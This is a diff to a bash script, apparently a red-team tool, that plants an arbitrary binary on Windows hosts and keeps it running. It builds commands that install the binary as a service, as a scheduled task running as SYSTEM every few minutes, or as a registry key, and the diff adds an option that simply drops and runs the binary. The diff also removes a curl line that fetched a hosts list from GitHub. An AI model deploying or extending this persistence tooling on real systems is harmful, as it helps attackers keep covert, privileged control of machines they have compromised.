@@ -1,8 +1,5 @@
 #!/bin/bash
 
-# Download hosts file
-curl https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/hosts/windows.txt -o windowsHosts.txt
-
 deploy() {
     read -p "Where is the binary stored: " binary
     echo "Is the folder where you want to store the binary already on the filesystem"
@@ -33,11 +30,12 @@ execute() {
 
     fullPath="$binPath\\$binName"
             
-    echo "Persistence Methods: " 
+    echo "Options: " 
     echo "1. Service"
     echo "2. Scheduled Task"
     echo "3. Registry Key"
-    read -rp "Which persistence method do you want to use: " persistMethod
+    echo "4. Just Drop and Execute (No Persistence)"
+    read -rp "Which option do you want to use: " persistMethod
     
     case $persistMethod in 
         1)
@@ -48,8 +46,8 @@ execute() {
             ;;
         2)
             read -rp "What do you want to name the scheduled task: " taskName
-            read -rp "What description do you want to set for the task: " taskDescription
-            persist="schtasks /create /sc minute /mo 15 /tn \"$taskName\" /tr \"$fullPath\" /ru \"SYSTEM\" /f ; schtasks /change /tn \"$taskName\" /description \"$taskDescription\""
+            read -rp "How often should the task run (in minutes): " taskFrequency
+            persist="schtasks /create /sc minute /mo $taskFrequency /tn \"$taskName\" /tr \"$fullPath\" /ru \"SYSTEM\" /f; schtasks /run /tn \"$taskName\""
             ;;
         3) 
             read -rp "Registry Path?: " regPath
@@ -68,8 +66,12 @@ execute() {
                     ;;
             esac
             ;;
+        4)
+            # Just drop and execute without persistence
+            persist="Start-Process -FilePath '$fullPath'; Write-Host 'Binary executed without persistence'"
+            ;;
         *)
-            echo "Invalid persistence method"
+            echo "Invalid option"
             return 1
             ;;
     esac
